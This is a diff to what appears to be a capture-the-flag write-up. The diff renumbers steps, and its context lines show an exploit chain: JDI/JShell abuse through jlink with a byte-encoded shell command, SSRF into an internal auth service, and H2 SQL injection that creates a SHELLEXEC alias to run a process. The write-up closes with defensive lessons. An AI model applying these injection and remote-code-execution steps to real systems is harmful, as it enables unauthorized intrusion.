@@ -53,7 +53,7 @@ SID=$(curl -s -X POST http://HOST:1337/login -d 'username=guest&password=guest')
 
 ```
 
-1. **Phase A (JDI → jlink writes JShell script)**
+2. **Phase A (JDI → jlink writes JShell script)**
 
 ```
 fields=new jdk.jshell.execution.JdiInitiator(
@@ -66,7 +66,7 @@ new map('jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base 
 
 `<BYTES>` encodes a shell command (e.g., `wget …` or the SSRF POST) as comma-separated byte values.
 
-1. **Phase B (JDI → run JShell script)**
+3. **Phase B (JDI → run JShell script)**
 
 ```
 fields=new jdk.jshell.execution.JdiInitiator(
@@ -76,13 +76,13 @@ true,'localhost',10000,new map())
 
 ```
 
-1. **SSRF into auth_service with H2 RCE payload**
+4. **SSRF into auth_service with H2 RCE payload**
 
 - Command executed by JShell: POST to `http://127.0.0.1:8000/login` with `password` built to inject H2:
   - Use `CSVWRITE` + `CREATE ALIAS SHELLEXEC AS 'java …'`.
   - In alias body, `new ProcessBuilder("/flag").start().getInputStream().readAllBytes()`; store output by creating a `User` whose `username` contains the flag and `Session(sessId='a')`.
 
-1. **Read the flag via order_service**
+5. **Read the flag via order_service**
 
 ```bash
 # trigger rendering where username contains flag and a dangling quote reveals it
@@ -99,7 +99,7 @@ curl -s -X POST http://HOST:1337/orders \
 
 **Lessons:** Always use parameterized queries in ORM (no string interpolation), disable dangerous H2 features in prod, and block intra-service SSRF (network policy).
 
-Writeup authors
+Writeup authors:
 
 ```python
 import base64
